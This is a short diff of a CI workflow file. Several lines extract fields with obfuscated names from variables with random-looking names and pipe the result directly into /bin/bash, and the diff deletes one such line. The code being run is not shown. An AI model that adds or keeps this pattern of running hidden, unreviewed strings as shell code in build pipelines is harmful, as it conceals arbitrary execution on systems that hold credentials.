@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$tn3" | jq -r .x40588 | /bin/bash
           echo $i7 | jq -r .kbv0821 | /bin/bash
           printf '%s' "$yfkw98" | jq -r .heahd84610 | /bin/bash
-          printf '%s' "$pieg68" | jq -r .y89781 | /bin/bash
           printf '%s' "$p079" | jq -r .cp3 | /bin/bash
 
       - name: Archive results
